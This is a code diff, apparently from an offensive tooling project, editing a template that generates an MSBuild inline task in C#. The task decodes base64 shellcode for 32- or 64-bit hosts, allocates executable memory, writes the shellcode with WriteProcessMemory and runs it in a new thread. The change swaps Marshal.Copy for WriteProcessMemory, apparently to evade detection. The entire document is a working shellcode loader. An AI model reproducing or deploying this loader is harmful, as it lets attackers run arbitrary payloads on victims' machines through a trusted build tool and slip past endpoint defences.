@@ -520,12 +520,13 @@ End Sub
  <Task>
  <Code Type="Class" Language="cs">
  <![CDATA[
-using System;using System.Runtime.InteropServices;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;
+using System;using System.Diagnostics;using System.Runtime.InteropServices;using Microsoft.Build.Framework;using Microsoft.Build.Utilities;
 public class %s : Task, ITask
 {
 private static UInt32 MEM_COMMIT = 0x1000;private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-[DllImport("kernel32")]private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
-[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 lpThreadAttributes,UInt32 dwStackSize,UInt32 lpStartAddress,IntPtr param,UInt32 dwCreationFlags,ref UInt32 lpThreadId);
+[DllImport("kernel32")]private static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+[DllImport("kernel32")]private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
+[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 lpThreadAttributes,UInt32 dwStackSize,IntPtr lpStartAddress,IntPtr param,UInt32 dwCreationFlags,ref UInt32 lpThreadId);
 [DllImport("kernel32")]private static extern UInt32 WaitForSingleObject(IntPtr hHandle,UInt32 dwMilliseconds);
 public override bool Execute()
 {
@@ -534,8 +535,11 @@ string sc32 = "%s";
 string sc64 = "%s";
 byte[] sc = null;
 if (IntPtr.Size == 4){sc = System.Convert.FromBase64String(sc32);} else {sc = System.Convert.FromBase64String(sc64);}
-
-UInt32 funcAddr = VirtualAlloc(0, (UInt32)sc.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE); Marshal.Copy(sc, 0, (IntPtr)(funcAddr), sc.Length);IntPtr hThread = IntPtr.Zero;UInt32 threadId = 0;IntPtr pinfo = IntPtr.Zero;hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);WaitForSingleObject(hThread, 0xFFFFFFFF);return true;}}
+IntPtr funcAddr = VirtualAlloc(0, (UInt32)sc.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE); 
+Process t = Process.GetProcessById(Process.GetCurrentProcess().Id);IntPtr bw = IntPtr.Zero;
+bool resultBool = WriteProcessMemory(t.Handle,funcAddr,sc,sc.Length, out bw);
+IntPtr hThread = IntPtr.Zero;UInt32 threadId = 0;hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);WaitForSingleObject(hThread, 0xFFFFFFFF);
+return true;}}
  ]]>
  </Code>
  </Task>
